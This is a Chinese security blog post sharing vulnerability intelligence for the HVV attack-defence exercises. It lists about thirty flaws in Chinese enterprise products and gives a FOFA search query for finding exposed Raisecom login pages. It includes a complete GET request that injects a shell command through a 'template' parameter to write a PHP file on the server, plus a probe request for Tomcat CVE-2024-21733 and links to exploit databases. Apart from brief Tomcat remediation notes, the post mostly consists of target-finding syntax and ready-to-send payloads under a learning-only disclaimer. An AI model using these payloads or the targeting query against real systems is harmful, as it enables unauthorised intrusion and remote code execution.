#  24HVV漏洞威胁最新情报(全)   
原创 LHACK安全  LHACK安全   2024-08-19 10:01  
  
**免责声明**  
```
本文所提供的技术、信息或工具仅供学习和参考使用。
请不要将这些信息用于任何非法或不当行为。
使用本文内容引起的任何损失或后果，完全由使用者负责，作者不承担任何责任。
使用这些信息即表示您同意本免责声明，并承诺遵守所有相关法律法规和道德规范。
```  
  
**HVV专项漏洞情报******  
```
K35-1开源-Webuserlogin-RCE
W22-1Windows-TCPIP组件-RCE
Y24-8云时空-社会化商业ERP系统-InformationLeakage
Z17-2紫光-电子档案管理系统-InformationLeakage
B15-1北京星网锐捷网络技术有限公司-乐享智能运维管理平台-SQL
C16-2喰星云-数字化餐饮服务系统-SQL
C16-3喰星云-数字化餐饮服务系统-SQL
D20-3DedeCMS--任意文件读取
F28-5方天云-智慧平台系统-任意文件上传
F8-20泛微-E-Office-InformationLeakage
K34-1开源-ZoneMinder-SQL
R14-3润申信息-企业标准化管理系统-SQL
S38-3赛蓝-企业管理系统-SQL
S44-2上海建业信息科技股份-章管家-SQL
S44-3上海建业信息科技股份-章管家-PermissionAC
T5-3Tomcat--InformationLeakage
W21-1WookTeam-在线团队协作工具-SQL
Y34-2银达云创-智慧校园管理系统-任意文件上传
K33-1开源-数字酒店宽带运营系统-任意文件读取
Y38-2用友-CRM客户关系管理系统-任意文件读取
Z18-1甄云-SRM云平台-JNDI注入
A18-3安美-数字酒店宽带运营系统-任意文件读取
Z15-3中成科-信票务管理系统-SQL
D1-6大华-DDS数字监控系统-SQL
H17-3H3C-iMC智能管理中心-RCE
H46-2H3C-iMC智能管理中心_-RCE
H46-3H3C-iMC智能管理中心_-RCE
H47-1杭州-三汇网关-RCE
H48-1H3C-SecPath下一代防火墙-任意文件上传
J30-2金斗云-HKMP智慧商业软件-SQL
K32-1开源-短视频直播打赏系统-SSRF
K32-2开源-短视频直播打赏系统-任意文件上传
U1-1usdtAdmin-收款管理系统-SQL
U1-2usdtAdmin-收款管理系统-PermissionAC
```  
### 漏洞poc  
```
FOFA语法：body="/images/raisecom/back.gif" && title=="Web user login"
```  
  
payload：  
```
GET /vpn/list_base_config.php?type=mod&parts=base_config&template=%60echo+-e+%27%3C%3Fphp+echo+%28phpinfo()%29%3Bunlink%28__FILE__%29%3B%3F%3E%27%3E%2Fwww%2Ftmp%2Ftest.php%60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Encoding: gzip, deflate, br
Connection: closeCopy to clipboardErrorCopied
```  
```
```  
  
访问验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2yKqSBD4TXC08sGVRS1Fq8XYldOxDhdg5E9aTzsiaroMjdhm8a2jhr1mGDtYWbFKuyaLRFDxRaQVrlawke0w0AQ/640?wx_fmt=png&from=appmsg "")  
##   
##   
  
**0day专项**  
## 漏洞信息  
  
Apache Tomcat 信息泄露漏洞（CVE-2024-21733）情报。Apache Tomcat 是一个开源 Java Servlet 容器和 Web 服务器，用于运行 Java 应用程序和动态网页。Coyote 是 Tomcat 的连接器，处理来自客户端的请求并将它们传递Tomcat 引擎进行处理。攻击者可以通过构造特定请求，在异常页面中输出其他请求的body 数据,修复版本中通过增加 finally 代码块,保证默认会重设缓冲区 position 和 limit 到一致的状态，从而造成信息泄露。  
  
影响版本  
```

```  
```
从8.5.7到8.5.63
9.0.0-M11到9.0.43Copy to clipboardErrorCopied
```  
```
POST / HTTP/1.1
Host: hostname
Sec-Ch-Ua: "Chromium";v="119", "Not?A_Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,
*/*
;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: keep-alive
Content-Length: 6
Content-Type: application/x-www-form-urlencoded
XCopy to clipboardErrorCopied
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2yKqSBD4TXC08sGVRS1Fq8XYldOxDhdgSh6dKeAEBLr26XuClBbgtYAlU47taDTENicictPoqQGrI5A6ueNHC09A/640?wx_fmt=png&from=appmsg "")  
  
同时提供一个简单的漏洞验证工具，规则设置的比较宽，为了防止漏测。工具测试结果仅供参考，不具有权威性。禁止使用工具进行非法操作和攻击，非法操作和攻击须有使用者本人承担，与该文章以及工具开发作者无关。![](https://mmbiz.qpic.cn/mmbiz_png/2yKqSBD4TXC08sGVRS1Fq8XYldOxDhdgfvBoQBRZ7dy3H2HsZCuNaC7sFKYfqWv5nZNVKzLSOmeh4BxiaaoBJuw/640?wx_fmt=png&from=appmsg "")  
  
  
修复方式  
1. 建议Tomcat不直接对外提供服务，Tomcat前面如果有其他中间件代理（如Nginx），则该漏洞无法利用。  
  
1. 在不影响正常业务的情况下，升级至8.5.64、9.0.44等安全版本。  
  
**总结******  
```
以上资源来自：http://kpanda.wiki/#/
```  
  
需要查看更多详情的师傅请自行查看  
  
推荐漏洞库信息：  
```
https://sploitus.com/
http://kpanda.wiki/#/
https://www.yuque.com/u25571586/dyaqbugs?#
```  
  
